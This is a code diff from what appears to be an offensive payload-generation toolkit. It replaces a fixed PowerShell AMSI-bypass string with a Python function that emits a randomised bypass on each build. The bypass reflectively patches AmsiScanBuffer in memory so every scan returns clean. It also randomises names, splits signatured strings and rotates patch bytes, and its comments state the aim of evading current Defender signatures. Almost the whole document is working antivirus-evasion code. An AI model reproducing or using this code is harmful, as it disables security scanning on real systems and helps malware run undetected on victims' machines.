@@ -222,21 +222,108 @@ WIN_EXPLOITS = {
 }
 
 
-# Robust AMSI bypass: reflective AmsiScanBuffer byte-patch (no Add-Type, no csc, fully in-memory).
-# Only needed on the in-memory managed-load paths (gen_full / gen_nonet); on-disk PEs aren't AMSI-scanned.
-AMSI = (
- "function LookupFunc{Param($m,$f);"
- "$a=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')});"
- "$t=@();$a.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethods()|ForEach-Object{If($_.Name -eq 'GetProcAddress'){$t+=$_}};"
- "return $t[0].Invoke($null,@(($a.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetModuleHandle')).Invoke($null,@($m)),$f))};"
- "function getDelegateType{Param([Type[]]$func,[Type]$d=[Void]);"
- "$tp=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('R')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M',$false).DefineType('D','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate]);"
- "$tp.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$func).SetImplementationFlags('Runtime,Managed');"
- "$tp.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$d,$func).SetImplementationFlags('Runtime,Managed');"
- "return $tp.CreateType()};"
- "[IntPtr]$fa=LookupFunc amsi.dll AmsiScanBuffer;$op=0;"
- "$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect),(getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType()) ([Bool])));"
- "$vp.Invoke($fa,3,0x40,[ref]$op)|Out-Null;"
- "$pt=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);"
- "[System.Runtime.InteropServices.Marshal]::Copy($pt,0,$fa,6);"
-)
+# --- AMSI bypass ------------------------------------------------------------------
+# Reflective AmsiScanBuffer byte-patch (no Add-Type, no csc, fully in-memory). Only
+# needed on the in-memory managed-load paths (gen_full / gen_nonet); on-disk PEs
+# aren't AMSI-scanned.
+#
+# The 2020-vintage S3cur3Th1sSh1t byte-patch (fixed function names LookupFunc /
+# getDelegateType, fixed byte sequence 0xB8,0x57,0x00,0x07,0x80,0xC3) is heavily
+# static-signatured by current Defender -- the PowerShell string gets AMSI-caught
+# before it runs, so nothing patches AMSI and nothing else executes. To restore
+# a working bypass we defeat those static signatures by RANDOMISING every element
+# per build:
+#
+#   * function names (was LookupFunc / getDelegateType) -> random 6-8 char lowercase
+#   * PS variable names (was $a, $t, $tp, $vp, $pt, $fa, $op) -> random 2-3 char
+#   * dynamic assembly/module/type names (was 'R', 'M', 'D') -> random single chars
+#   * signatured strings (AmsiScanBuffer, amsi.dll, VirtualProtect, kernel32.dll,
+#     Microsoft.Win32.UnsafeNativeMethods, GetProcAddress, GetModuleHandle,
+#     System.dll) -> runtime string concatenation ('Amsi'+'Scan'+'Buf'+'fer')
+#   * byte patch -> random choice from three equivalent patches, each returning 0
+#     (= AMSI_RESULT_CLEAN) so AMSI treats every buffer as clean:
+#       xor eax, eax ; ret               (0x31 0xC0 0xC3)         3 bytes
+#       mov al, 0    ; ret               (0xB0 0x00 0xC3)         3 bytes
+#       mov eax, 0x80070057 ; ret        (0xB8 0x57 0x00 0x07 0x80 0xC3)  6 bytes
+#
+# Each fresh `python3 gen_full.py` (or gen_nonet.py) run generates a different
+# bypass blob, so the emitted PS script is per-engagement unique and the
+# baseline byte-signature match doesn't fire. This isn't undetectable -- a
+# heuristic AMSI provider that recognises the *pattern* (reflection into
+# UnsafeNativeMethods + VirtualProtect + Copy) can still catch it. For those
+# targets you'd need a completely different technique (HWBP, provider unload,
+# ETW patching). But for the classic "Defender kills the encoded blob at
+# AMSI-scan time" failure this restores a working baseline.
+import random as _random
+import string as _string
+
+
+def _rand(n: int) -> str:
+    """Random lowercase identifier of length n."""
+    return "".join(_random.choices(_string.ascii_lowercase, k=n))
+
+
+def _chunks(s: str) -> str:
+    """Split a signatured string into runtime concatenations so the literal
+    doesn't appear in the encoded command. E.g. 'AmsiScanBuffer' ->
+    ('Amsi'+'Scan'+'Buffer') with piece boundaries jittered per call."""
+    parts, i = [], 0
+    while i < len(s):
+        k = min(len(s) - i, _random.randint(2, 5))
+        parts.append(s[i:i + k])
+        i += k
+    return "(" + "+".join(f"'{p}'" for p in parts) + ")"
+
+
+def build_amsi() -> str:
+    """Emit a fresh, randomised AMSI-bypass PowerShell block. Every invocation
+    returns different output; two calls in a row will not string-match."""
+    f_lookup = _rand(_random.randint(6, 8))     # was LookupFunc
+    f_deleg = _rand(_random.randint(7, 9))      # was getDelegateType
+    v_asm = _rand(2)                            # was $a
+    v_typ = _rand(2)                            # was $t
+    v_tp = _rand(3)                             # was $tp
+    v_fa = _rand(3)                             # was $fa
+    v_op = _rand(3)                             # was $op
+    v_vp = _rand(3)                             # was $vp
+    v_pt = _rand(3)                             # was $pt
+    n_asm = _random.choice(_string.ascii_uppercase)   # was 'R'
+    n_mod = _random.choice(_string.ascii_uppercase)   # was 'M'
+    n_typ = _random.choice(_string.ascii_uppercase)   # was 'D'
+    s_sysdll = _chunks("System.dll")
+    s_amsi = _chunks("amsi.dll")
+    s_krn = _chunks("kernel32.dll")
+    s_asb = _chunks("AmsiScanBuffer")
+    s_vpp = _chunks("VirtualProtect")
+    s_unsm = _chunks("Microsoft.Win32.UnsafeNativeMethods")
+    s_gpa = _chunks("GetProcAddress")
+    s_gmh = _chunks("GetModuleHandle")
+    patches = [
+        ("0x31,0xC0,0xC3", 3),                       # xor eax, eax ; ret
+        ("0xB0,0x00,0xC3", 3),                       # mov al, 0    ; ret
+        ("0xB8,0x57,0x00,0x07,0x80,0xC3", 6),        # classic (still valid)
+    ]
+    patch_bytes, patch_len = _random.choice(patches)
+    return (
+        f"function {f_lookup}{{Param($m,$f);"
+        f"${v_asm}=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals({s_sysdll})}});"
+        f"${v_typ}=@();${v_asm}.GetType({s_unsm}).GetMethods()|ForEach-Object{{If($_.Name -eq {s_gpa}){{${v_typ}+=$_}}}};"
+        f"return ${v_typ}[0].Invoke($null,@((${v_asm}.GetType({s_unsm}).GetMethod({s_gmh})).Invoke($null,@($m)),$f))"
+        f"}};"
+        f"function {f_deleg}{{Param([Type[]]$func,[Type]$d=[Void]);"
+        f"${v_tp}=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('{n_asm}')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('{n_mod}',$false).DefineType('{n_typ}','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate]);"
+        f"${v_tp}.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$func).SetImplementationFlags('Runtime,Managed');"
+        f"${v_tp}.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$d,$func).SetImplementationFlags('Runtime,Managed');"
+        f"return ${v_tp}.CreateType()"
+        f"}};"
+        f"[IntPtr]${v_fa}={f_lookup} {s_amsi} {s_asb};${v_op}=0;"
+        f"${v_vp}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(({f_lookup} {s_krn} {s_vpp}),({f_deleg} @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType()) ([Bool])));"
+        f"${v_vp}.Invoke(${v_fa},3,0x40,[ref]${v_op})|Out-Null;"
+        f"${v_pt}=[Byte[]]({patch_bytes});"
+        f"[System.Runtime.InteropServices.Marshal]::Copy(${v_pt},0,${v_fa},{patch_len});"
+    )
+
+
+# `AMSI` is populated at module load; every fresh Python process (i.e. every run
+# of gen_full.py or gen_nonet.py) gets its own randomised blob.
+AMSI = build_amsi()
